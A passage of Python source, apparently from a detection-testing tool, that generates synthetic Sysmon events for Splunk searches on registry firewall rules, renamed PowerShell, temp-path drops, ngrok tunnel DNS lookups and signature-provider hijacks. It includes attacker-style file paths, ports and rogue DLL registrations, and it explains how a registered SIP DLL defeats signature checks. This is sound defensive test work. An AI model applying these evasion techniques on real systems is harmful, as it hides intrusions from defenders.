    'v2.26|Action=Block|Active=TRUE|Dir=In|Protocol=17|LPort={port}|Name={name}|',
]

#: What an attacker opens, and what they call it.
FIREWALL_RULE_NAMES = ['Mytestfirewal1', 'Windows Update Helper', 'RDP-Inbound',
                       'SysHelper', 'Remote Assistance', 'Chrome Update Service']
FIREWALL_RULE_APPS = ['C:\\MyApp\\MyApp1.exe', 'C:\\Users\\Public\\svc.exe',
                      'C:\\Windows\\Temp\\update.exe', 'C:\\ProgramData\\host\\agent.exe']
FIREWALL_RULE_PORTS = ['3389', '445', '4444', '8080', '5985']

#: netsh and the firewall service both write through svchost, which is what the
#: real dataset shows; the others are how a rule gets added by hand.
FIREWALL_WRITERS = ['C:\\Windows\\system32\\svchost.exe',
                    'C:\\Windows\\system32\\netsh.exe',
                    'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe']

#: Registry writes that are not firewall rules — the first clause missed.
ELSEWHERE_KEYS = [
    'HKLM\\System\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\'
    'FirewallPolicy\\StandardProfile\\EnableFirewall',
    'HKLM\\System\\CurrentControlSet\\Services\\Dnscache\\Start',
    'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDrive',
]


class SysmonAttackGenerator(BaseAttackGenerator):
    """Shared plumbing for an attack whose events are Sysmon.

    Every one of them renders through the source's own generator, so one place
    decides what a Sysmon event looks like and the benign noise is literally
    what the sender already emits. A subclass supplies `plan_identities` and
    `_build`, which turns one planned identity into the call that renders it.
    """

    FIELD_DEFAULTS = {}

    def __init__(self, field_behaviors, options=None):
        super().__init__(field_behaviors, options)
        self._sysmon = SysmonLogGenerator()

    def generate(self) -> str:
        self.event_count += 1
        return self._render(self._identity)

    def generate_noise(self) -> str:
        return self._render(self._identity)

    def _render(self, event):
        event = event or self._standalone()
        if event.get('ordinary'):
            return self._sysmon.generate()
        return self._sysmon.render(self._build(event))

    def _build(self, event):
        raise NotImplementedError


class SysmonFirewallRuleGenerator(SysmonAttackGenerator):
    """A firewall rule written straight into the registry (T1562.004).

    The detection is a tstats over Endpoint.Registry:

        WHERE Registry.registry_path = "*\\System\\CurrentControlSet\\Services
              \\SharedAccess\\Parameters\\FirewallPolicy\\FirewallRules\\*"
              Registry.action = modified
        BY  action dest process_guid process_id registry_hive registry_path
            registry_key_name registry_value_data registry_value_name
            registry_value_type status user vendor_product

    There is no `fillnull` here, and a tstats `BY` drops every row where one BY
    field is null — the trap the port scans already hit. Twelve of the thirteen
    are satisfied by construction: an EventID 13 gives action=modified and
    status=success, the HKLM\\System\\ prefix fills registry_hive, and the rest
    come from fields every Sysmon registry event carries.

    The thirteenth, `registry_value_type`, the add-on leaves empty. It builds it
    as `"REG_" + RegistryValueType`, and RegistryValueType is extracted only
    from a Details of the form `TYPE (value)` — a DWORD or a QWORD. A firewall
    rule is a REG_SZ whose Details is the rule itself, `v2.26|Action=Allow|…`,
    so nothing is extracted. Splunk's own True Positive dataset for this
    detection (attack_data T1112/firewall_modify_delete) has the same shape.

    That does not stop the search. Splunk_SA_CIM gives the field a default, so
    it arrives as "unknown" rather than null and the BY keeps the row —
    measured on a real install: 217 rows REG_DWORD, 892 unknown. The events
    here are modelled on that dataset exactly rather than given a
    `DWORD (0x…)`, which would fill the field with a firewall rule no Windows
    ever wrote.
    """

    @classmethod
    def plan_identities(cls, definition, options, attacks, noise, environment, rng=random):
        """(attack identities, noise identities), each event decided once.

        One endpoint and one account for the run. Each attack event writes one
        rule under FirewallRules. The noise misses one clause at a time: the
        same key with an action other than modified — which is the EventID 12
        DeleteValue Splunk's own dataset pairs it with — and modified values
        somewhere else in the registry.
        """
        values = (environment or {}).get('values') or {}
        identity = options.get('attack_identity')
        identity = identity if isinstance(identity, dict) else {}

        def choice(field):
            value = identity.get(field)
            return value if isinstance(value, dict) else {}

        dest = _single_value(choice('dest'), 'dest', values,
                             lambda r: r.choice(WINDOWS_WORKSTATIONS), rng)
        user = _single_value(choice('user'), 'user', values,
                             lambda r: r.choice(WINDOWS_ATTACK_USERS), rng)

        def rule_value():
            return rng.choice(FIREWALL_RULE_SHAPES).format(
                app=rng.choice(FIREWALL_RULE_APPS),
                port=rng.choice(FIREWALL_RULE_PORTS),
                name=rng.choice(FIREWALL_RULE_NAMES))

        def guid():
            return ('{%08X-%04X-%04X-%04X-%012X}' % (
                rng.randint(0, 0xFFFFFFFF), rng.randint(0, 0xFFFF), rng.randint(0, 0xFFFF),
                rng.randint(0, 0xFFFF), rng.randint(0, 0xFFFFFFFFFFFF)))

        def event(**extra):
            return {'dest': dest, 'user': user,
                    'image': rng.choice(FIREWALL_WRITERS), **extra}

        attack_identities = [
            event(event_id=13, event_type='SetValue',
                  target_object=f'{FIREWALL_RULES_KEY}\\{guid()}',
                  details=rule_value())
            for _ in range(attacks)
        ]

        noise_identities = []
        for _ in range(noise):
            draw = rng.random()
            if draw < 0.4:
                # The same key, but removed rather than written: action=deleted.
                noise_identities.append(event(
                    event_id=12, event_type='DeleteValue',
                    target_object=f'{FIREWALL_RULES_KEY}\\{guid()}', details=None))
            elif draw < 0.7:
                # A value modified, somewhere that is not a firewall rule.
                noise_identities.append(event(
                    event_id=13, event_type='SetValue',
                    target_object=rng.choice(ELSEWHERE_KEYS),
                    details=f'DWORD (0x{rng.randint(0, 4):08x})'))
            else:
                noise_identities.append(event(ordinary=True))
        return attack_identities, noise_identities

    def _build(self, event):
        return self._sysmon.registry_event(
            event['event_id'], target_object=event['target_object'],
            image=event['image'], details=event.get('details'),
            event_type=event['event_type'], dest=event['dest'], user=event['user'])

    def _standalone(self):
        """An event rendered outside a plan — a preview, or a format test."""
        return {'dest': random.choice(WINDOWS_WORKSTATIONS),
                'user': random.choice(WINDOWS_ATTACK_USERS),
                'image': random.choice(FIREWALL_WRITERS),
                'event_id': 13, 'event_type': 'SetValue',
                'target_object': f'{FIREWALL_RULES_KEY}\\{{0D807408-8157-49B9-ACFC-0B5C15B1119E}}',
                'details': FIREWALL_RULE_SHAPES[0].format(
                    app=FIREWALL_RULE_APPS[0], port='3389', name=FIREWALL_RULE_NAMES[0])}


SYSMON_ATTACK_TYPES = {
    'sysmon_firewall_rule_registry': {
        'name': 'Windows Modify Registry to Add or Modify Firewall Rule',
        'description': 'A firewall rule written straight into the registry under '
                       'FirewallPolicy\\FirewallRules, the way netsh does it '
                       '(T1562.004)',
        'log_type': 'sysmon',
        'category': 'Endpoint',
        'datamodel': 'Endpoint',
        'splunk_research_url': 'https://research.splunk.com/endpoint/43254751-e2ce-409a-b6b4-4f851e8dcc26/',
        'data_sources': [
            {'log_type': 'sysmon',
             'sourcetype': 'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational',
             'label': 'Sysmon · registry value set (EventID 13)',
             'formats': ['xml']},
        ],
        # splunk/security_content detections/endpoint/
        # windows_modify_registry_to_add_or_modify_firewall_rule.yml
        'detection': {
            'name': 'Windows Modify Registry to Add or Modify Firewall Rule',
            'id': '43254751-e2ce-409a-b6b4-4f851e8dcc26',
            'datamodel': 'Endpoint.Registry',
            'where': 'Registry.registry_path = "*\\\\System\\\\CurrentControlSet\\\\Services'
                     '\\\\SharedAccess\\\\Parameters\\\\FirewallPolicy\\\\FirewallRules\\\\*" '
                     'Registry.action = modified',
            'by': ['action', 'dest', 'process_guid', 'process_id', 'registry_hive',
                   'registry_path', 'registry_key_name', 'registry_value_data',
                   'registry_value_name', 'registry_value_type', 'status', 'user',
                   'vendor_product'],
            'entities': ['dest', 'user'],
        },
        'defaults': {'events': 1, 'noise_events': 20, 'duration': 30},
        'count_label': 'Number of Events',
        'count_hint': 'Each rule written triggers the detection on its own — '
                      'no threshold to reach.',
        'identity_fields': [
            {'field': 'dest', 'mode': 'asset', 'label': 'Endpoint',
             'picker': 'assets', 'picker_value': 'nt_host', 'kind': 'hostname',
             'hint': 'The machine the rule was written on (Computer).'},
            {'field': 'user', 'mode': 'asset', 'label': 'User',
             'picker': 'identities', 'picker_value': 'username', 'kind': 'username',
             'hint': 'The account the writing process ran as (User).'},
        ],
        'ai_fields': {
            'dest': {'type': 'entity', 'entity_type': 'endpoint', 'entity_field': 'nt_host',
                     'description': 'Endpoint the firewall rule was written on'},
            'user': {'type': 'either', 'options': [
                        {'type': 'account', 'account_type': 'standard', 'account_field': 'username'},
                        {'type': 'account', 'account_type': 'admin', 'account_field': 'username'},
                     ],
                     'description': 'Account the writing process ran as'},
        },
        'field_behaviors': {},
        'sample_logs': [
            "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"5770385F-C22A-43E0-BF4C-06F5698FFBD9\"/><EventID>13</EventID><Version>2</Version><Level>4</Level><Task>13</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-02-18T10:30:01.000000Z'/><EventRecordID>13249</EventRecordID><Correlation/><Execution ProcessID=\"1992\" ThreadID=\"2400\"/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKS-FIN01</Computer><Security UserID=\"S-1-5-18\"/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>SetValue</Data><Data Name='UtcTime'>2026-02-18 10:30:01.000</Data><Data Name='ProcessGuid'>848A6B75-314B-6675-1500-000000000B03</Data><Data Name='ProcessId'>1128</Data><Data Name='Image'>C:\\Windows\\system32\\svchost.exe</Data><Data Name='TargetObject'>HKLM\\System\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\FirewallRules\\{0D807408-8157-49B9-ACFC-0B5C15B1119E}</Data><Data Name='Details'>v2.26|Action=Allow|Active=TRUE|Dir=In|App=C:\\MyApp\\MyApp1.exe|Name=Mytestfirewal1|</Data><Data Name='User'>CORP\\jsmith</Data></EventData></Event>",
        ],
    },
}


#: The three binaries the detection watches, each with the OriginalFileName its
#: PE header carries and the process name that is legitimate for it. Renaming
#: the file changes Image; it does not touch the header.
POWERSHELL_IDENTITIES = [
    ('PowerShell.EXE', 'powershell.exe', 'Windows PowerShell'),
    ('pwsh.dll', 'pwsh.exe', 'PowerShell'),
    ('powershell_ise.EXE', 'powershell_ise.exe', 'Windows PowerShell ISE'),
]

#: What a renamed copy gets called, and where it is dropped. RelTekAudio.exe
#: under ProgramData is the one in Splunk's own test data.
RENAMED_POWERSHELL = [
    'C:\\ProgramData\\RelTekAudio.exe',
    'C:\\Users\\Public\\svchost.exe',
    'C:\\Windows\\Temp\\winlogon.exe',
    'C:\\ProgramData\\Intel\\DrvUpdate.exe',
    'C:\\Users\\Public\\Downloads\\chrome_update.exe',
]

#: Where the real ones live, for the benign half.
POWERSHELL_REAL_PATHS = {
    'powershell.exe': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    'pwsh.exe': 'C:\\Program Files\\PowerShell\\7\\pwsh.exe',
    'powershell_ise.exe': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe',
}

#: Ordinary binaries whose OriginalFileName is their own — the third kind of
#: noise, neither PowerShell nor renamed.
UNRELATED_BINARIES = [
    ('C:\\Windows\\System32\\svchost.exe', 'svchost.exe'),
    ('C:\\Windows\\System32\\taskhostw.exe', 'taskhostw.exe'),
    ('C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', 'chrome.exe'),
]


class SysmonRenamedPowershellGenerator(SysmonAttackGenerator):
    """PowerShell running under another name (T1036.003).

    The detection pairs two fields that come from different places:

        Processes.original_file_name = PowerShell.EXE
        Processes.process_name      != powershell.exe

    `original_file_name` is the OriginalFileName in the binary's PE header,
    which renaming the file leaves untouched; `process_name` is the basename of
    Image. Copy powershell.exe to RelTekAudio.exe and the two stop agreeing —
    which is the whole finding, and the same shape as the SysWOW64 attack.

    Two conditions the add-on imposes. `EVAL-original_file_name` covers
    EventCode 1 and 7 only, and refuses the value "-", so the field has to carry
    a real name. And the twenty fields the search groups by must all be present,
    or the tstats BY drops the row; Sysmon fills nineteen and
    Splunk_TA_windows' generic stanza supplies user_id off the Security element.

    Modelled on attack_data T1036.003/renamed_powershell, where a
    `C:\\ProgramData\\RelTekAudio.exe` carrying OriginalFileName PowerShell.EXE
    sits beside a genuine powershell.exe carrying the same header — which is
    exactly the near miss the noise needs.
    """

    @classmethod
    def plan_identities(cls, definition, options, attacks, noise, environment, rng=random):
        """(attack identities, noise identities), each event decided once.

        One endpoint and one account for the run. Each attack event is one of
        the three binaries running under a name that is not its own.

        The noise misses the clause from either side: the same binary under its
        real name — the pair Splunk's dataset ships — and ordinary processes
        whose OriginalFileName matches their own.
        """
        values = (environment or {}).get('values') or {}
        identity = options.get('attack_identity')
        identity = identity if isinstance(identity, dict) else {}

        def choice(field):
            value = identity.get(field)
            return value if isinstance(value, dict) else {}

        dest = _single_value(choice('dest'), 'dest', values,
                             lambda r: r.choice(WINDOWS_WORKSTATIONS), rng)
        user = _single_value(choice('user'), 'user', values,
                             lambda r: r.choice(WINDOWS_ATTACK_USERS), rng)

        def event(**extra):
            return {'dest': dest, 'user': user, **extra}

        attack_identities = []
        for _ in range(attacks):
            original, _real_name, _desc = rng.choice(POWERSHELL_IDENTITIES)
            image = rng.choice(RENAMED_POWERSHELL)
            attack_identities.append(event(
                image=image, original_file_name=original,
                command_line=f'"{image}" '))

        noise_identities = []
        for _ in range(noise):
            if rng.random() < 0.5:
                # The same header, under the name it is supposed to have.
                original, real_name, _desc = rng.choice(POWERSHELL_IDENTITIES)
                image = POWERSHELL_REAL_PATHS[real_name]
                noise_identities.append(event(
                    image=image, original_file_name=original,
                    command_line=f'"{image}" -NoProfile -Command Get-Date'))
            else:
                image, original = rng.choice(UNRELATED_BINARIES)
                noise_identities.append(event(
                    image=image, original_file_name=original,
                    command_line=f'{image} -k netsvcs'))
        return attack_identities, noise_identities

    def _build(self, event):
        return self._sysmon.process_event(
            image=event['image'], command_line=event['command_line'],
            original_file_name=event['original_file_name'],
            dest=event['dest'], user=event['user'])

    def _standalone(self):
        """An event rendered outside a plan — a preview, or a format test."""
        image = RENAMED_POWERSHELL[0]
        return {'dest': random.choice(WINDOWS_WORKSTATIONS),
                'user': random.choice(WINDOWS_ATTACK_USERS),
                'image': image, 'original_file_name': 'PowerShell.EXE',
                'command_line': f'"{image}" '}


SYSMON_PROCESS_ATTACK_TYPES = {
    'sysmon_renamed_powershell': {
        'name': 'Windows Renamed Powershell Execution',
        'description': 'PowerShell copied to another filename and run from it — the '
                       'PE header still says PowerShell.EXE while the image does not '
                       '(T1036.003)',
        'log_type': 'sysmon',
        'category': 'Endpoint',
        'datamodel': 'Endpoint',
        'splunk_research_url': 'https://research.splunk.com/endpoint/c08014de-cc5a-42de-9775-76ecd5b37bbd/',
        'data_sources': [
            {'log_type': 'sysmon',
             'sourcetype': 'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational',
             'label': 'Sysmon · process creation (EventID 1)',
             'formats': ['xml']},
        ],
        # splunk/security_content detections/endpoint/
        # windows_renamed_powershell_execution.yml
        'detection': {
            'name': 'Windows Renamed Powershell Execution',
            'id': 'c08014de-cc5a-42de-9775-76ecd5b37bbd',
            'datamodel': 'Endpoint.Processes',
            'where': 'Processes.original_file_name = PowerShell.EXE '
                     'Processes.process_name != powershell.exe',
            'by': ['action', 'dest', 'original_file_name', 'parent_process',
                   'parent_process_exec', 'parent_process_guid', 'parent_process_id',
                   'parent_process_name', 'parent_process_path', 'process',
                   'process_exec', 'process_guid', 'process_hash', 'process_id',
                   'process_integrity_level', 'process_name', 'process_path', 'user',
                   'user_id', 'vendor_product'],
            'entities': ['dest', 'user'],
        },
        'defaults': {'events': 1, 'noise_events': 20, 'duration': 30},
        'count_label': 'Number of Events',
        'count_hint': 'Each renamed execution triggers the detection on its own — '
                      'no threshold to reach.',
        'identity_fields': [
            {'field': 'dest', 'mode': 'asset', 'label': 'Endpoint',
             'picker': 'assets', 'picker_value': 'nt_host', 'kind': 'hostname',
             'hint': 'The machine the renamed binary ran on (Computer).'},
            {'field': 'user', 'mode': 'asset', 'label': 'User',
             'picker': 'identities', 'picker_value': 'username', 'kind': 'username',
             'hint': 'The account it ran as (User).'},
        ],
        'ai_fields': {
            'dest': {'type': 'entity', 'entity_type': 'endpoint', 'entity_field': 'nt_host',
                     'description': 'Endpoint the renamed PowerShell ran on'},
            'user': {'type': 'either', 'options': [
                        {'type': 'account', 'account_type': 'standard', 'account_field': 'username'},
                        {'type': 'account', 'account_type': 'admin', 'account_field': 'username'},
                     ],
                     'description': 'Account it ran as'},
        },
        'field_behaviors': {},
        'sample_logs': [
            "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"5770385F-C22A-43E0-BF4C-06F5698FFBD9\"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-02-18T10:30:01.000000Z'/><EventRecordID>1588086</EventRecordID><Correlation/><Execution ProcessID=\"3372\" ThreadID=\"4656\"/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKS-FIN01</Computer><Security UserID=\"S-1-5-18\"/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-02-18 10:30:01.000</Data><Data Name='ProcessGuid'>F51F9151-D6B4-671B-5506-000000001600</Data><Data Name='ProcessId'>3020</Data><Data Name='Image'>C:\\ProgramData\\RelTekAudio.exe</Data><Data Name='FileVersion'>10.0.19041.1</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft\u00ae Windows\u00ae Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>\"C:\\ProgramData\\RelTekAudio.exe\" </Data><Data Name='CurrentDirectory'>C:\\Windows\\system32\\</Data><Data Name='User'>CORP\\jsmith</Data><Data Name='LogonGuid'>F51F9151-D420-671B-E503-000000000000</Data><Data Name='LogonId'>0x3e5</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=F586835082F632DC8D9404D83BC16316,SHA256=643EC58E82E0272C97C2A59F6020970D881AF19C0AD5029DB9C958C13B6558C7,IMPHASH=F9BBD96FAE53B7A31264A703CAFA0666</Data><Data Name='ParentProcessGuid'>F51F9151-D420-671B-0B00-000000001600</Data><Data Name='ParentProcessId'>708</Data><Data Name='ParentImage'>C:\\Windows\\explorer.exe</Data><Data Name='ParentCommandLine'>C:\\Windows\\Explorer.EXE</Data><Data Name='ParentUser'>CORP\\jsmith</Data></EventData></Event>",
        ],
    },
}


#: Extensions the temp-path detection watches, and the paths it watches them in.
DROPPED_EXTENSIONS = ['.exe', '.dll', '.ps1', '.bat', '.vbs', '.js', '.cmd', '.sys']
TEMP_PATHS = [
    'C:\\Users\\{user}\\AppData\\Local\\Temp',
    'C:\\Windows\\Temp',
    'D:\\Temp',
]
#: Written by PowerShell every time it checks its execution policy, and the one
#: thing the search excludes by name.
PS_POLICY_TEST = 'C:\\Users\\{user}\\AppData\\Local\\Temp\\__PSScriptPolicyTest_{stem}.ps1'
#: Files dropped in a temp path that are not executable, and executables dropped
#: somewhere ordinary — one near miss per clause.
HARMLESS_TEMP_FILES = ['.tmp', '.log', '.txt', '.dat', '.etl']
ORDINARY_PATHS = [
    'C:\\Program Files\\Internal\\bin',
    'C:\\Users\\{user}\\Documents',
    'C:\\Windows\\System32',
]
DROPPERS = [
    'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    'C:\\Windows\\System32\\cmd.exe',
    'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
    'C:\\Windows\\System32\\certutil.exe',
]


class SysmonTempPathDropGenerator(SysmonAttackGenerator):
    """An executable or script written into a temp directory (T1036).

        Filesystem.action = "created"
        Filesystem.file_name IN ("*.exe", "*.ps1", "*.dll", …)
        Filesystem.file_path IN ("*:\\Temp\\*", "*\\AppData\\Local\\Temp\\*", …)
        NOT Filesystem.file_path IN ("*\\__PSScriptPolicyTest_*")

    `action` is the part worth knowing. The add-on reads no field for it on an
    EventID 11: it compares UtcTime with CreationUtcTime, so a file written for
    the first time reads as "created" and one replaced in place as "modified".
    Only the first satisfies this search, so every attack event is a new file
    and the noise includes overwrites.

    This detection also settles an earlier mistake. Its BY names file_hash,
    file_size, file_acl, file_access_time and file_modify_time — none of which
    Sysmon reports on a file creation — and that was read as making it
    unreachable. Splunk_SA_CIM defaults its fields, so they arrive as "unknown"
    and the BY keeps the row. Measured: file_hash came back 109 rows of
    "unknown" on a real install.
    """

    @classmethod
    def plan_identities(cls, definition, options, attacks, noise, environment, rng=random):
        """(attack identities, noise identities), each event decided once.

        The noise misses one clause at a time: a harmless extension in the same
        temp path, an executable written somewhere ordinary, the PowerShell
        policy-test file the search excludes by name, and overwrites rather than
        creations.
        """
        values = (environment or {}).get('values') or {}
        identity = options.get('attack_identity')
        identity = identity if isinstance(identity, dict) else {}

        def choice(field):
            value = identity.get(field)
            return value if isinstance(value, dict) else {}

        dest = _single_value(choice('dest'), 'dest', values,
                             lambda r: r.choice(WINDOWS_WORKSTATIONS), rng)
        user = _single_value(choice('user'), 'user', values,
                             lambda r: r.choice(WINDOWS_ATTACK_USERS), rng)
        bare = str(user).split('\\')[-1]

        def stem():
            return f'{rng.choice(["svc", "upd", "run", "tmp", "hlp"])}{rng.randint(100, 999)}'

        def event(**extra):
            return {'dest': dest, 'user': user,
                    'image': rng.choice(DROPPERS), **extra}

        attack_identities = [
            event(target_filename=(rng.choice(TEMP_PATHS).format(user=bare)
                                   + f'\\{stem()}{rng.choice(DROPPED_EXTENSIONS)}'),
                  overwrite=False)
            for _ in range(attacks)
        ]

        noise_identities = []
        for _ in range(noise):
            draw = rng.random()
            temp = rng.choice(TEMP_PATHS).format(user=bare)
            if draw < 0.3:
                # Right place, harmless extension.
                noise_identities.append(event(
                    target_filename=f'{temp}\\{stem()}{rng.choice(HARMLESS_TEMP_FILES)}',
                    overwrite=False))
            elif draw < 0.55:
                # Right extension, ordinary place.
                noise_identities.append(event(
                    target_filename=(rng.choice(ORDINARY_PATHS).format(user=bare)
                                     + f'\\{stem()}{rng.choice(DROPPED_EXTENSIONS)}'),
                    overwrite=False))
            elif draw < 0.8:
                # The file the search excludes by name.
                noise_identities.append(event(
                    target_filename=PS_POLICY_TEST.format(user=bare, stem=stem()),
                    overwrite=False))
            else:
                # An overwrite, so action is "modified" rather than "created".
                noise_identities.append(event(
                    target_filename=f'{temp}\\{stem()}{rng.choice(DROPPED_EXTENSIONS)}',
                    overwrite=True))
        return attack_identities, noise_identities

    def _build(self, event):
        return self._sysmon.file_event(
            target_filename=event['target_filename'], image=event['image'],
            overwrite=event['overwrite'], dest=event['dest'], user=event['user'])

    def _standalone(self):
        return {'dest': random.choice(WINDOWS_WORKSTATIONS),
                'user': random.choice(WINDOWS_ATTACK_USERS),
                'image': DROPPERS[0], 'overwrite': False,
                'target_filename': 'C:\\Windows\\Temp\\svc417.exe'}


#: The names the ngrok detection watches, and the addresses a tunnel resolves to.
NGROK_QUERIES = [
    '{stem}.ngrok.io', '{stem}.ngrok.com',
    'ngrok.{stem}.tunnel.com', 'korgn.{stem}.lennut.com',
]
NGROK_STEMS = ['4f2a91bc', 'a1b2c3d4', 'tunnel-7', 'edge01', '9d8e7f6a']
#: A tunnel answers with several addresses, which is what makes answer_count
#: worth grouping by.
NGROK_ANSWERS = [
    'type:  1 3.14.22.90;type:  1 18.191.44.7;',
    'type:  5 tunnel.ngrok.agent;type:  1 52.14.201.33;',
    'type:  1 3.20.115.4;',
]
#: Names a workstation resolves all day, for the noise.
BENIGN_QUERIES = [
    ('outlook.office365.com', 'type:  5 outlook.ha.office365.com;type:  1 52.109.8.22;'),
    ('www.google.com', 'type:  1 142.250.75.196;'),
    ('update.microsoft.com', 'type:  1 20.42.65.92;'),
    ('corp.local', 'type:  1 10.20.1.10;'),
]
#: Near misses on the glob: ngrok in the wrong position.
NGROK_NEAR_MISSES = ['ngrok.io.example.com', 'notngrok.net', 'myngrok.internal.corp']

#: What reaches a tunnel — the client itself, or whatever it was launched from.
NGROK_CLIENTS = [
    'C:\\Users\\Public\\ngrok.exe',
    'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    'C:\\ProgramData\\svc\\tunnel.exe',
]


class SysmonNgrokDnsGenerator(SysmonAttackGenerator):
    """A host resolving an ngrok tunnel (T1572, T1090).

        WHERE DNS.query IN ("*.ngrok.com","*.ngrok.io",
                            "ngrok.*.tunnel.com","korgn.*.lennut.com")
        BY DNS.answer DNS.answer_count DNS.query DNS.query_count
           DNS.reply_code_id DNS.src DNS.vendor_product

    The grouping is what makes this one worth generating: `answer` is not a
    field Sysmon writes. The add-on pulls it out of QueryResults with a
    repeating match on `type:  <n>  <value>;`, and `answer_count` is
    mvcount(answer) — so an entry missing its semicolon costs both fields, and
    a tunnel that resolves to two addresses has to keep both to count as two.

    `src` is not the workstation's IP either: `EVAL-src` takes Computer for
    EventCode 22, so it is the hostname.
    """

    @classmethod
    def plan_identities(cls, definition, options, attacks, noise, environment, rng=random):
        """(attack identities, noise identities), each event decided once.

        The noise is ordinary resolution plus the names that look like ngrok
        without matching the globs — `ngrok.io.example.com` has it as a label
        rather than a suffix.
        """
        values = (environment or {}).get('values') or {}
        identity = options.get('attack_identity')
        identity = identity if isinstance(identity, dict) else {}

        def choice(field):
            value = identity.get(field)
            return value if isinstance(value, dict) else {}

        dest = _single_value(choice('dest'), 'dest', values,
                             lambda r: r.choice(WINDOWS_WORKSTATIONS), rng)
        user = _single_value(choice('user'), 'user', values,
                             lambda r: r.choice(WINDOWS_ATTACK_USERS), rng)

        def event(**extra):
            return {'dest': dest, 'user': user,
                    'image': rng.choice(NGROK_CLIENTS), **extra}

        attack_identities = [
            event(query_name=rng.choice(NGROK_QUERIES).format(stem=rng.choice(NGROK_STEMS)),
                  query_results=rng.choice(NGROK_ANSWERS), query_status='0')
            for _ in range(attacks)
        ]

        noise_identities = []
        for _ in range(noise):
            if rng.random() < 0.7:
                name, results = rng.choice(BENIGN_QUERIES)
                noise_identities.append(event(query_name=name, query_results=results,
                                              query_status='0'))
            else:
                noise_identities.append(event(
                    query_name=rng.choice(NGROK_NEAR_MISSES),
                    query_results='-', query_status='9003'))
        return attack_identities, noise_identities

    def _build(self, event):
        return self._sysmon.dns_event(
            query_name=event['query_name'], query_results=event['query_results'],
            query_status=event['query_status'], image=event['image'],
            dest=event['dest'], user=event['user'])

    def _standalone(self):
        return {'dest': random.choice(WINDOWS_WORKSTATIONS),
                'user': random.choice(WINDOWS_ATTACK_USERS),
                'image': NGROK_CLIENTS[0], 'query_name': '4f2a91bc.ngrok.io',
                'query_results': NGROK_ANSWERS[0], 'query_status': '0'}


#: The four keys the SIP detection watches. A subject interface package tells
#: Windows how to verify a signature, so a DLL registered here is trusted to
#: say a file is signed.
SIP_KEYS = [
    'HKLM\\SOFTWARE\\Microsoft\\Cryptography\\Providers\\{guid}',
    'HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\'
    'CryptSIPDllVerifyIndirectData\\{guid}',
    'HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\Providers\\{guid}',
    'HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\\EncodingType 0\\'
    'CryptSIPDllGetSignedDataMsg\\{guid}',
]
#: The two value names the search reads. Anything else under the same key is
#: configuration and not the hijack.
SIP_VALUE_NAMES = ['Dll', '$DLL']
SIP_OTHER_VALUES = ['FuncName', 'CryptSIPDllVerifyIndirectData', 'Dll32']
#: What gets registered, and what a legitimate provider points at.
SIP_ROGUE_DLLS = [
    'C:\\Users\\Public\\sip.dll', 'C:\\Windows\\Temp\\cryptsip.dll',
    'C:\\ProgramData\\Intel\\drvsip.dll', 'MySIP.dll',
]
SIP_REAL_DLLS = ['WINTRUST.DLL', 'C:\\Windows\\System32\\wintrust.dll', 'PWRSHSIP.DLL']
#: Registry keys that are not SIP at all, for the other half of the noise.
NON_SIP_KEYS = [
    'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDrive',
    'HKLM\\System\\CurrentControlSet\\Services\\Dnscache\\Start',
    'HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid',
]
SIP_WRITERS = [
    'C:\\Windows\\System32\\reg.exe',
    'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    'C:\\Windows\\System32\\regsvr32.exe',
]


class SysmonSipProviderGenerator(SysmonAttackGenerator):
    """A subject interface package pointed at another DLL (T1553.003).

        WHERE Registry.registry_path IN
              ("*\\SOFTWARE\\Microsoft\\Cryptography\\Providers\\*",
               "*\\SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType*", … WOW6432Node)
              Registry.registry_value_name IN ("Dll","$DLL")

    A SIP tells Windows how to verify a signature. Register your own DLL under
    one of these keys and Windows asks it whether a file is signed, so anything
    it vouches for passes.

    `registry_value_name` is the second clause and it is not a field Sysmon
    writes: for an EventID 13 the add-on takes the last segment of TargetObject.
    So the path has to end in `\\Dll` or `\\$DLL`, which is also what the real
    technique writes.

    The detection lists Sysmon EventID 7 alongside 13, because the DLL is loaded
    once it is registered, but its search reads Endpoint.Registry only. The
    attack therefore emits the registry write — an image load would be faithful
    to the technique and would not fire this search.
    """

    @classmethod
    def plan_identities(cls, definition, options, attacks, noise, environment, rng=random):
        """(attack identities, noise identities), each event decided once.

        The noise misses one clause at a time: the same keys with a value name
        the search ignores, and writes to keys that are not SIP at all.
        """
